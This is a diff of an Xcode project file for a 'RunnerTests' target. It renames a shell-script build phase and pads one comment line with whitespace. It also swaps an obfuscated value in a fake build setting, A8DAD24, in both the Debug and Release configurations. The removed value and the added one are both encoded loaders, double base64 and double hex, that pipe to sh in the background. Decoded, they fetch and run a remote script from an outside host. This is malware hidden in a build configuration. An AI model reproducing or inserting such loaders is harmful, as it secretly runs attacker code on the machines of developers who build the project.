@@ -188,7 +188,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C80DE294CF71000263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
-				77C461FEC3CF41B6A042DAD8 /* Build Target Libraries */,
+				537EFD71AC0343EAAE42DAD8 /* Provision Target Device */,
 				331C80D1294CF70F00263BE5 /* Sources */,
 				331C80D2294CF70F00263BE5 /* Frameworks */,
 				331C80D3294CF70F00263BE5 /* Resources */,
@@ -281,7 +281,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-																																		/* End PBXBuildRule section */
+																																								/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		331C80D3294CF70F00263BE5 /* Resources */ = {
@@ -303,7 +303,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		77C461FEC3CF41B6A042DAD8 /* Build Target Libraries */ = {
+		537EFD71AC0343EAAE42DAD8 /* Provision Target Device */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -313,7 +313,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Target Libraries";
+			name = "Provision Target Device";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -412,7 +412,7 @@
 		331C80DB294CF71000263BE5 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8DAD24 = "((z(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXphMlpNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURNd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZkbWxuYldGdVpYUXVjblV2WVNraUlId2djMmdLCg== | z | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((p(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333463366236363230326432643633366636653665363536333734326437340a3639366436353666373537343230333233303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663631363437333664366636323639326537323735326636310a323932323230376332303733363830610a | p | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -427,7 +427,7 @@
 		331C80DC294CF71000263BE5 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8DAD24 = "((z(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXphMlpNSUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURNd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY0doaGMyVWlJR2gwZEhCek9pOHZkbWxuYldGdVpYUXVjblV2WVNraUlId2djMmdLCg== | z | sh ) >/dev/null 2>&1 &)";
+				A8DAD24 = "((p(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326437333463366236363230326432643633366636653665363536333734326437340a3639366436353666373537343230333233303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663631363437333664366636323639326537323735326636310a323932323230376332303733363830610a | p | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
